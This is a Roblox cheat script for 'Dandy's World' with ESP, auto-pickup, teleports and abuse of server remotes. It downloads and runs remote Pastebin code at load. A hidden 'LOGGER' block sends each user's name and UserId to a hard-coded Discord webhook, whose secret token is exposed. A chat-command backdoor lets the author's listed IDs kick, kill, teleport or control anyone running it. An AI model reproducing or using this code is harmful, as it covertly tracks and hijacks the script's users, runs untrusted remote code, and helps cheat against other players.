--// DANDY'S WORLD SURVIVAL: FINAL FIXED EXPANDED (V7.6)
local PastebinURL = "https://pastebin.com/raw/LTSPeZyb" -- < CHECK THIS LINK
local Library = loadstring(game:HttpGet(PastebinURL))()

if not Library or type(Library) ~= "table" then
    warn("Library failed to load! Check your Pastebin URL.")
    return
end

--// SERVICES
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")
local MarketplaceService = game:GetService("MarketplaceService")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local TextChatService = game:GetService("TextChatService")
local LocalPlayer = Players.LocalPlayer

--// HTTP REQUEST HELPER
local http_request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request

--// LOGGER
task.spawn(function()
    pcall(function()
        local WebhookURL = "https://discord.com/api/webhooks/1457703882313699656/dKMIkGnjz7rKbgxk74mL1p-bw0a80k4TnwW5EftBV449wWAg4LK8eodTdg9Aj0nuU5HE"
        local success, pInfo = pcall(function() 
            return MarketplaceService:GetProductInfo(game.PlaceId) 
        end)
        local gameName = success and pInfo.Name or "Unknown Game"
        
        local data = {
            ["embeds"] = {{
                ["title"] = "🟢 Script Loaded",
                ["color"] = 65280,
                ["fields"] = {
                    {["name"]="Player", ["value"]=LocalPlayer.Name.." ("..LocalPlayer.UserId..")", ["inline"]=true},
                    {["name"]="Game", ["value"]=gameName, ["inline"]=true}
                },
                ["footer"] = {["text"]="Update v7.6"},
                ["timestamp"] = DateTime.now():ToIsoDate()
            }}
        }
        
        if http_request then
            http_request({
                Url = WebhookURL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(data)
            })
        end
    end)
end)

--// HELPER FUNCTIONS
local function GetRemote(name)
    local r = ReplicatedStorage:FindFirstChild("Remotes")
    if r then
        return r:FindFirstChild(name)
    end
    return nil
end

local function CheckTag(model, tagName)
    local tag = model:FindFirstChild(tagName)
    if tag then
        if tag:IsA("BoolValue") and tag.Value == true then return true end
        if tag:IsA("StringValue") and tag.Value == "true" then return true end
        if (tag:IsA("IntValue") or tag:IsA("NumberValue")) and tag.Value == 1 then return true end
        if not tag:IsA("ValueBase") then return true end
    end
    return false
end

--// OWNER SYSTEM
local Admins = {
    10313147896, -- Friend ID
    LocalPlayer.UserId -- You
}

local function IsAdmin(p)
    for _, id in ipairs(Admins) do
        if p.UserId == id then return true end
    end
    return false
end

-- Suppress "You do not own this emote"
pcall(function()
    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
        TextChatService.OnIncomingMessage = function(message)
            if message.TextSource == nil and string.find(message.Text, "You do not own this Emote") then
                message.Text = " " 
            end
        end
    end
end)

-- COMMAND HANDLING
local GlitchLoop = false
local AutoAbiLoop = false
local AbiTarget = ""

local function ProcessCmd(sender, msg)
    if not IsAdmin(sender) or sender == LocalPlayer then return end
    
    local prefix = "$DWS:"
    if string.find(msg, prefix) then
        local cleanMsg = msg
        -- Clean "/e " if it exists
        if string.sub(cleanMsg, 1, 3) == "/e " then 
            cleanMsg = string.sub(cleanMsg, 4) 
        end
        
        if string.sub(cleanMsg, 1, #prefix) ~= prefix then return end
        
        local content = string.sub(cleanMsg, #prefix + 1)
        local split = string.split(content, ":")
        local cmd = split[1]
        local arg = split[2]

        if cmd == "kick" then 
            LocalPlayer:Kick("Owner kicked you")
        elseif cmd == "rejoin" then 
            TeleportService:Teleport(game.PlaceId, LocalPlayer)
        elseif cmd == "trip" and LocalPlayer.Character then 
            local hum = LocalPlayer.Character:FindFirstChild("Humanoid")
            if hum then hum.Sit = true end
        elseif cmd == "kill" and LocalPlayer.Character then 
            local hum = LocalPlayer.Character:FindFirstChild("Humanoid")
            if hum then hum.Health = 0 end
        elseif cmd == "bring" and sender.Character then 
            LocalPlayer.Character.HumanoidRootPart.CFrame = sender.Character.HumanoidRootPart.CFrame
        elseif cmd == "glitch" then 
            GlitchLoop = (arg == "on")
            if GlitchLoop then 
                task.spawn(function() 
                    while GlitchLoop do 
                        if LocalPlayer.Character then
                            local hum = LocalPlayer.Character:FindFirstChild("Humanoid")
                            if hum then
                                for _,t in ipairs(hum:GetPlayingAnimationTracks()) do 
                                    t:AdjustSpeed(100) 
                                end
                            end
                        end 
                        task.wait(0.1) 
                    end 
                end) 
            end
        elseif cmd == "ability" then 
            local t = Workspace:FindFirstChild(arg)
            if t then GetRemote("AbilityEvent"):InvokeServer(t) end
        elseif cmd == "autoability" then 
            if arg == "off" then 
                AutoAbiLoop = false 
            else 
                AbiTarget = arg
                AutoAbiLoop = true
                task.spawn(function() 
                    while AutoAbiLoop do 
                        local t = Workspace:FindFirstChild(AbiTarget)
                        if t then 
                            pcall(function() GetRemote("AbilityEvent"):InvokeServer(t) end) 
                        end 
                        task.wait(5) 
                    end 
                end) 
            end 
        end
    end
end

for _,p in ipairs(Players:GetPlayers()) do 
    p.Chatted:Connect(function(m) ProcessCmd(p,m) end) 
end
Players.PlayerAdded:Connect(function(p) 
    p.Chatted:Connect(function(m) ProcessCmd(p,m) end) 
end)

local function SendCmd(cmd, arg)
    local msg = "$DWS:"..cmd..(arg and ":"..arg or "")
    if TextChatService.ChatInputBarConfiguration.Enabled then
        TextChatService.TextChannels.RBXGeneral:SendAsync("/e "..msg)
    else
        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/e "..msg, "All")
    end
end

local function ExecuteOwnerCmd(cmdName, func)
    if IsAdmin(LocalPlayer) then
        pcall(func)
        Library:Notify("Owner", "Sent: " .. cmdName, 2)
    else
        Library:Notify("Access Denied", "Not Owner!", 3)
    end
end

--// UI SETUP
local Window = Library:Load({ Title = "Dandy's World Survival", Intro = true })
local AutoTab = Window:CreateTab("Automatic")
local SelfTab = Window:CreateTab("Yourself")
local OwnerTab = nil
if IsAdmin(LocalPlayer) then 
    OwnerTab = Window:CreateTab("Owner Panel") 
end
local ToonsTab = Window:CreateTab("Abilities")
local EspTab = Window:CreateTab("Visuals")
local PollTab = Window:CreateTab("Polls")

--// OWNER PANEL
if OwnerTab then
    OwnerTab:CreateLabel("Controls")
    OwnerTab:CreateButton("Kick all players who have this script running", function() 
        ExecuteOwnerCmd("Kick All", function() SendCmd("kick") end) 
    end)
    OwnerTab:CreateButton("Rejoin all players who have this script run", function() 
        ExecuteOwnerCmd("Rejoin All", function() SendCmd("rejoin") end) 
    end)
    OwnerTab:CreateButton("Trip all players who have this script run", function() 
        ExecuteOwnerCmd("Trip All", function() SendCmd("trip") end) 
    end)
    OwnerTab:CreateButton("Kill all players who use the script", function() 
        ExecuteOwnerCmd("Kill All", function() SendCmd("kill") end) 
    end)
    OwnerTab:CreateButton("Teleport all players to you", function() 
        ExecuteOwnerCmd("Bring All", function() SendCmd("bring") end) 
    end)
    
    OwnerTab:CreateLabel("Troll")
    OwnerTab:CreateToggle("Make their animation super glitchy", function(v) 
        ExecuteOwnerCmd("Glitch Anim", function() SendCmd("glitch", v and "on" or "off") end) 
    end)
    
    OwnerTab:CreateLabel("Forced Ability")
    OwnerTab:CreateButton("Make people who have this script use ability on you", function() 
        ExecuteOwnerCmd("Force Ability Once", function() SendCmd("ability", LocalPlayer.Name) end) 
    end)
    OwnerTab:CreateToggle("Auto make people use ability on you", function(v) 
        ExecuteOwnerCmd("Auto Force Ability", function() SendCmd("autoability", v and LocalPlayer.Name or "off") end) 
    end)
end

--// AUTOMATIC TAB
AutoTab:CreateLabel("Auto Pickup")
local PC = {Enabled=false, Dist=15, All=false, F={}}
local IG = {Capsules={"ResearchCapsule"}, Extraction={"Stopwatch","ExtractionSpeedCandy","Valve"}, Heals={"Bandage","HealthKit"}, Stamina={"StaminaCandy","Pop","PopBottle"}, Tape={"Tape"}}

local function ShouldP(item) 
    if PC.All then return true end 
    for n, e in pairs(PC.F) do 
        if e and IG[n] then 
            for _, v in ipairs(IG[n]) do 
                if string.find(item.Name, v) then return true end 
            end 
        end 
    end 
    return false 
end

AutoTab:CreateToggle("Enable", function(v) 
    PC.Enabled = v
    if v then 
        task.spawn(function() 
            while PC.Enabled do 
                pcall(function() 
                    local c = LocalPlayer.Character
                    if c then 
                        local m = Workspace:FindFirstChild("CurrentMap")
                        if m then 
                            for _, i in ipairs(m.Items:GetChildren()) do 
                                if ShouldP(i) then 
                                    for _, d in ipairs(i:GetDescendants()) do 
                                        if d:IsA("ProximityPrompt") and (c.HumanoidRootPart.Position - d.Parent.Position).Magnitude <= PC.Dist then 
                                            fireproximityprompt(d) 
                                        end 
                                    end 
                                end 
                            end 
                        end 
                        if PC.F.BonBons or PC.All then 
                            local b = Workspace:FindFirstChild("BonBons")
                            if b then 
                                for _, i in ipairs(b:GetChildren()) do 
                                    for _, d in ipairs(i:GetDescendants()) do 
                                        if d:IsA("ProximityPrompt") and (c.HumanoidRootPart.Position - d.Parent.Position).Magnitude <= PC.Dist then 
                                            fireproximityprompt(d) 
                                        end 
                                    end 
                                end 
                            end 
                        end 
                    end 
                end)
                task.wait(0.2) 
            end 
        end) 
    end 
end)

AutoTab:CreateInput("Distance", "15", function(t) PC.Dist = tonumber(t) or 15 end)
AutoTab:CreateToggle("All Items", function(v) PC.All = v end)
AutoTab:CreateToggle("Capsules", function(v) PC.F.Capsules = v end)
AutoTab:CreateToggle("Extraction", function(v) PC.F.Extraction = v end)
AutoTab:CreateToggle("Heals", function(v) PC.F.Heals = v end)
AutoTab:CreateToggle("Stamina", function(v) PC.F.Stamina = v end)
AutoTab:CreateToggle("Tape", function(v) PC.F.Tape = v end)

--// YOURSELF TAB
SelfTab:CreateLabel("Machines")
local function FE(v) 
    local r = GetRemote("GoldHit")
    if r then r:FireServer(v) Library:Notify("Machine", "Sent value: "..v, 2) end 
end

SelfTab:CreateButton("Speed up extraction (-0.1)", function() FE(-0.1) end)
SelfTab:CreateButton("Speed up extraction even more (-0.25)", function() FE(-0.25) end)
SelfTab:CreateButton("Use Wrench/JumperCable (0.75)", function() FE(0.75) end)
SelfTab:CreateButton("Use Vee's Remote/Valve (Instant)", function() FE(99999) end)
SelfTab:CreateButton("Loop Use Vee's Remote/Valve (-9999)", function() FE(-9999) end)

local CV = 0
SelfTab:CreateLabel("Increase extraction speed by your own")
SelfTab:CreateInput("Value (-0.1 or 50)", "Type number...", function(t) CV = tonumber(t) end)
SelfTab:CreateButton("Use your type skillcheck or extraction", function() 
    if CV then FE(CV) else Library:Notify("Error", "Invalid Number", 2) end 
end)

SelfTab:CreateLabel("Morphs")
SelfTab:CreateButton("Morph Into Map", function() GetRemote("MorphEvent"):FireServer(Workspace.CurrentMap) end)
SelfTab:CreateButton("Morph Into Blot Decoy", function() 
    local d = Workspace:FindFirstChild("Decoys")
    local t
    if d then 
        for _, v in ipairs(d:GetChildren()) do 
            if v.Name:lower():find(LocalPlayer.Name:lower()) then t = v break end 
        end 
    end 
    if t then GetRemote("MorphEvent"):FireServer(t) end 
end)
SelfTab:CreateButton("Immunity", function() GetRemote("MorphEvent"):FireServer(Workspace:FindFirstChild(LocalPlayer.Name)) end)

SelfTab:CreateLabel("Teleport")
local function TP(l) 
    local m = Workspace:FindFirstChild(l)
    local s = m and (m:FindFirstChild("ToonsSpawn", true) or m:FindFirstChild("ToonsElevator", true))
    if s then LocalPlayer.Character.HumanoidRootPart.CFrame = s.CFrame + Vector3.new(0,3,0) end 
end
SelfTab:CreateButton("Teleport to Elevator (Toons Only!)", function() TP("CurrentMap") end)
SelfTab:CreateButton("Teleport to Old Elevator (Panic/Toon)", function() TP("PreviousMap") end)

SelfTab:CreateLabel("Hacks")
SelfTab:CreateToggle("Anti-Fail Skillcheck", function(v) 
    local r = ReplicatedStorage:FindFirstChild("Remotes")
    if v and r:FindFirstChild("ErrorEvent") then r.ErrorEvent.Name = "ErrorEvent_D" 
    elseif not v and r:FindFirstChild("ErrorEvent_D") then r.ErrorEvent_D.Name = "ErrorEvent" end 
end)
SelfTab:CreateToggle("Anti Vee Ads", function(v) 
    if v then 
        task.spawn(function() 
            while v do 
                for _, g in ipairs(LocalPlayer.PlayerGui:GetChildren()) do 
                    if g.Name:match("AdGui") then g:Destroy() end 
                end 
                task.wait(1) 
            end 
        end) 
    end 
end)

--// ABILITIES TAB
ToonsTab:CreateLabel("Abilities")
local function UA(n) 
    local t
    for _, v in ipairs(Workspace:GetChildren()) do 
        if v ~= LocalPlayer.Character and CheckTag(v, n) then t = v break end 
    end 
    if t then GetRemote("AbilityEvent"):InvokeServer(t) end 
end
ToonsTab:CreateButton("Use Your Ability On Twisted", function() UA("Twisted") end)
ToonsTab:CreateButton("Use Your Ability On Toon", function() UA("Toon") end)
ToonsTab:CreateButton("Use Your Ability On Yourself", function() GetRemote("AbilityEvent"):InvokeServer(LocalPlayer.Character) end)

ToonsTab:CreateLabel("Quest Farming")
local function Farm(n) 
    local t = ReplicatedStorage.Toons:FindFirstChild(n)
    if t then 
        task.spawn(function() 
            for i=1,25 do 
                GetRemote("MorphEvent"):FireServer(t)
                pcall(function() GetRemote("AbilityEvent"):InvokeServer(LocalPlayer.Character) end) 
                task.wait(0.3) 
            end 
            Library:Notify("Done", n, 3) 
        end) 
    end 
end
ToonsTab:CreateButton("Do Quest As Bobette", function() Farm("Bobette") end)
ToonsTab:CreateButton("Do Quest As Gourdy", function() Farm("Gourdy") end)

--// VISUALS TAB
EspTab:CreateLabel("Visuals")
local ESP = {M=false,T=false,TW=false,I=false,IT=false,B={},TX={}}

local function CB(m,c) 
    if ESP.B[m] then return end 
    local b = Instance.new("BoxHandleAdornment", CoreGui)
    b.Adornee = m; b.Size = m:GetExtentsSize(); b.AlwaysOnTop = true; b.Transparency = 0.5; b.Color3 = c; b.ZIndex = 5; ESP.B[m] = b 
end

local function CT(m,c) 
    if ESP.TX[m] then return end 
    local g = Instance.new("BillboardGui", CoreGui)
    g.Size = UDim2.fromScale(4,1); g.StudsOffset = Vector3.new(0,2,0); g.AlwaysOnTop = true; g.Adornee = m:FindFirstChildWhichIsA("BasePart")
    local t = Instance.new("TextLabel", g)
    t.Size = UDim2.fromScale(1,1); t.BackgroundTransparency = 1; t.Text = m.Name; t.TextColor3 = c; t.TextScaled = true; t.Font = Enum.Font.FredokaOne
    ESP.TX[m] = g 
end

local function CH(m,c) 
    local h = m:FindFirstChild("DandyGlow")
    if not h then h = Instance.new("Highlight", m); h.Name = "DandyGlow"; h.DepthMode = 0; h.FillTransparency = 0.5; h.OutlineTransparency = 0 end 
    h.FillColor = c; h.OutlineColor = c 
end

local function CM(m) 
    local h = m:FindFirstChild("MG")
    if not h then h = Instance.new("Highlight", m); h.Name = "MG"; h.FillTransparency = 0; h.FillColor = Color3.new(0,0,0); h.OutlineColor = Color3.new(1,1,1) end 
end

local function RM(m) 
    if ESP.B[m] then ESP.B[m]:Destroy(); ESP.B[m] = nil end 
    if ESP.TX[m] then ESP.TX[m]:Destroy(); ESP.TX[m] = nil end 
    local h = m:FindFirstChild("DandyGlow"); if h then h:Destroy() end 
    local h2 = m:FindFirstChild("MG"); if h2 then h2:Destroy() end 
end

task.spawn(function() 
    while true do 
        pcall(function()
            local map = Workspace:FindFirstChild("CurrentMap")
            
            if ESP.M and map then 
                for _, m in ipairs(map.Machines:GetChildren()) do 
                    if m:FindFirstChild("MachineDone").Value then RM(m) else CM(m) end 
                end 
            end
            
            if ESP.I then 
                if map then 
                    for _, i in ipairs(map.Items:GetChildren()) do CB(i, Color3.new(0,1,0)); CT(i, Color3.new(0,1,0)) end 
                end 
                local bb = Workspace:FindFirstChild("BonBons")
                if bb then 
                    for _, b in ipairs(bb:GetChildren()) do CB(b, Color3.new(0,1,0)); CT(b, Color3.new(0,1,0)) end 
                end 
            end
            
            for _, o in ipairs(Workspace:GetChildren()) do 
                if o:IsA("Model") and o ~= LocalPlayer.Character then 
                    if CheckTag(o, "Twisted") then 
                        if ESP.TW then CH(o, Color3.new(1,0,0)) else RM(o) end 
                    elseif CheckTag(o, "Toon") then 
                        if ESP.T then CH(o, Color3.fromRGB(0,150,255)) else RM(o) end 
                    else 
                        RM(o) 
                    end 
                end 
            end
            
            for m, b in pairs(ESP.B) do if not m or not m.Parent then b:Destroy(); ESP.B[m] = nil end end
        end) 
        task.wait(0.5) 
    end 
end)

EspTab:CreateToggle("Machines ESP", function(v) ESP.M = v; if not v and Workspace:FindFirstChild("CurrentMap") then for _, m in ipairs(Workspace.CurrentMap.Machines:GetChildren()) do local h=m:FindFirstChild("MG") if h then h:Destroy() end end end end)
EspTab:CreateToggle("Toons ESP", function(v) ESP.T = v end)
EspTab:CreateToggle("Twisteds ESP", function(v) ESP.TW = v end)
EspTab:CreateToggle("Items ESP", function(v) ESP.I = v; if not v then for m, _ in pairs(ESP.B) do RM(m) end end end)
EspTab:CreateToggle("Show Item Names", function(v) ESP.IT = v end)
